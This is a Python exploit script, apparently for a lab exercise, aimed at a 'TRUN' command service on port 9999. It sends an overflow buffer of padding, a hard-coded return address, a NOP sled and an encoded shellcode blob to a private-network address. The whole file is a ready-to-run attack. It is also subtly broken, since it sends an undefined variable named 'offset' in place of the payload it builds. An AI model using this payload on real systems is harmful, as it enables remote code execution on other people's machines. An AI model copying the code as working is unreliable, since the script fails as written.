#!/usr/bin/python

import sys,socket


overflow = (
"\xd9\xc0\xd9\x74\x24\xf4\xb8\x26\xae\xdd\x2f\x5b\x33\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\xcd\x52\x3f\xda\xed\x43\x42"
"\x25\x0d\x94\x23\xaf\xe8\xa5\x63\xcb\x79\x95\x53\x9f\x2f\x1a"
"\x1f\xcd\xdb\xa9\x6d\xda\xec\x1a\xdb\x3c\xc3\x9b\x70\x7c\x42"
"\x18\x8b\x51\xa4\x21\x44\xa4\xa5\x66\xb9\x45\xf7\x3f\xb5\xf8"
"\xe7\x34\x83\xc0\x8c\x07\x05\x41\x71\xdf\x24\x60\x24\x6b\x7f"
"\xa2\xc7\xb8\x0b\xeb\xdf\xdd\x36\xa5\x54\x15\xcc\x34\xbc\x67"
"\x2d\x9a\x81\x47\xdc\xe2\xc6\x60\x3f\x91\x3e\x93\xc2\xa2\x85"
"\xe9\x18\x26\x1d\x49\xea\x90\xf9\x6b\x3f\x46\x8a\x60\xf4\x0c"
"\xd4\x64\x0b\xc0\x6f\x90\x80\xe7\xbf\x10\xd2\xc3\x1b\x78\x80"
"\x6a\x3a\x24\x67\x92\x5c\x87\xd8\x36\x17\x2a\x0c\x4b\x7a\x23"
"\xe1\x66\x84\xb3\x6d\xf0\xf7\x81\x32\xaa\x9f\xa9\xbb\x74\x58"
"\xcd\x91\xc1\xf6\x30\x1a\x32\xdf\xf6\x4e\x62\x77\xde\xee\xe9"
"\x87\xdf\x3a\xbd\xd7\x4f\x95\x7e\x87\x2f\x45\x17\xcd\xbf\xba"
"\x07\xee\x15\xd3\xa2\x15\xfe\xd6\x32\x17\x01\x8e\x30\x17\xec"
"\x13\xbc\xf1\x64\xbc\xe8\xaa\x10\x25\xb1\x20\x80\xaa\x6f\x4d"
"\x82\x21\x9c\xb2\x4d\xc2\xe9\xa0\x3a\x22\xa4\x9a\xed\x3d\x12"
"\xb2\x72\xaf\xf9\x42\xfc\xcc\x55\x15\xa9\x23\xac\xf3\x47\x1d"
"\x06\xe1\x95\xfb\x61\xa1\x41\x38\x6f\x28\x07\x04\x4b\x3a\xd1"
"\x85\xd7\x6e\x8d\xd3\x81\xd8\x6b\x8a\x63\xb2\x25\x61\x2a\x52"
"\xb3\x49\xed\x24\xbc\x87\x9b\xc8\x0d\x7e\xda\xf7\xa2\x16\xea"
"\x80\xde\x86\x15\x5b\x5b\xa6\xf7\x49\x96\x4f\xae\x18\x1b\x12"
"\x51\xf7\x58\x2b\xd2\xfd\x20\xc8\xca\x74\x24\x94\x4c\x65\x54"
"\x85\x38\x89\xcb\xa6\x68")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 +  overflow 


try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.1',9999))
	s.send(('TRUN /.:/' + offset))
	s.close()
except:
	print("Error connecting to server")
	sys.exit()
